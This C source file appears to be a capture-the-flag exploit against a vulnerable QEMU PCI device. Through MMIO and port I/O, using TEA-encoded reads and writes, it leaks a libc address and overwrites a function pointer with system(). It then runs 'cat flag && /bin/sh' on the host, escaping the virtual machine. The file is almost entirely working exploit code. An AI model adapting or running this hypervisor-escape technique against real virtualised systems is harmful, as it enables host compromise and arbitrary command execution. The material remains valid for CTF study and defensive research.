#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/io.h>

char *mmio_mem;

inline static unsigned int mmio_read(unsigned int addr)
{
    unsigned int *mmio = (unsigned int *)((size_t)mmio_mem + addr);
    return *(mmio);
}

inline static void mmio_write(long addr, unsigned int val)
{
    unsigned int *mmio = (unsigned int *)((size_t)mmio_mem + addr);
    *(mmio) = val;
}

#define IO_PORT 0xc040

inline static size_t pmio_read(size_t addr)
{
    size_t pmio = IO_PORT + addr;
    return inl(pmio);
}

inline static void pmio_write(size_t addr, size_t val)
{
    size_t pmio = IO_PORT + addr;
    outl(val, pmio);
}

#define DELTA 0x61C88647

void tea_encrypt(uint32_t *v, uint32_t *k)
{
    uint32_t v0 = v[0], v1 = v[1], sum = 0, i;           /* set up */
    uint32_t delta = DELTA;                              /* a key schedule constant */
    uint32_t k0 = k[0], k1 = k[1], k2 = k[2], k3 = k[3]; /* cache key */
    for (i = 0; i < 32; i++)
    { /* basic cycle start */
        sum -= delta;
        v0 += ((v1 << 4) + k0) ^ (v1 + sum) ^ ((v1 >> 5) + k1);
        v1 += ((v0 << 4) + k2) ^ (v0 + sum) ^ ((v0 >> 5) + k3);
    } /* end cycle */
    v[0] = v0;
    v[1] = v1;
}

void tea_decrypt(uint32_t *v, uint32_t *k)
{
    uint32_t v0 = v[0], v1 = v[1], sum = 0xC6EF3720, i;  /* set up */
    uint32_t delta = DELTA;                              /* a key schedule constant */
    uint32_t k0 = k[0], k1 = k[1], k2 = k[2], k3 = k[3]; /* cache key */
    for (i = 0; i < 32; i++)
    { /* basic cycle start */
        v1 -= ((v0 << 4) + k2) ^ (v0 + sum) ^ ((v0 >> 5) + k3);
        v0 -= ((v1 << 4) + k0) ^ (v1 + sum) ^ ((v1 >> 5) + k1);
        sum += delta;
    } /* end cycle */
    v[0] = v0;
    v[1] = v1;
}

size_t readword(size_t addr)
{
    unsigned int key[4] = {0};
    unsigned int value[2] = {0};

    value[0] = mmio_read(addr);
    value[1] = mmio_read(addr);
    tea_encrypt(value, key);

    return value[1] * 0x100000000 + value[0];
}

void writeword(size_t addr, size_t val)
{
    unsigned int key[4] = {0};
    unsigned int value[2] = {0};

    value[0] = val;
    value[1] = val >> 32;
    tea_decrypt(value, key);
    mmio_write(addr, value[0]);
    mmio_write(addr, value[1]);
}

int main()
{
    int mmio_fd;
    size_t value;
    size_t libc_addr, system_addr;
    int i;

    // Open and map I/O memory for the string device
    mmio_fd = open("/sys/devices/pci0000:00/0000:00:03.0/resource0", O_RDWR | O_SYNC);
    if (mmio_fd == -1)
    {
        perror("open");
        exit(EXIT_FAILURE);
    }
    mmio_mem = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
    if (mmio_mem == MAP_FAILED)
    {
        perror("mmap");
        exit(EXIT_FAILURE);
    }
    iopl(3);
    pmio_write(4, 0);     // Set key to 0, 0, 0, 0
    pmio_write(8, 0x100); // set buffer_offset = 0x100
    libc_addr = readword(0x18) - 0x4aeb0;
    printf("libc_addr: %#lx\n", libc_addr);

    system_addr = libc_addr + 0x55410;
    writeword(0x18, system_addr);
    value = readword(0x18);

#if 1
    pmio_write(8, 0); // set buffer_offset = 0x100
    writeword(0, 0x2026262067616c66);
    writeword(8, 0x68732f6e69622f);
    pmio_write(28, 0x20746163); // system("cat ""flag && /bin/sh");
#else
    pmio_write(28, 0x6873); // system("sh");
#endif

    return 0;
}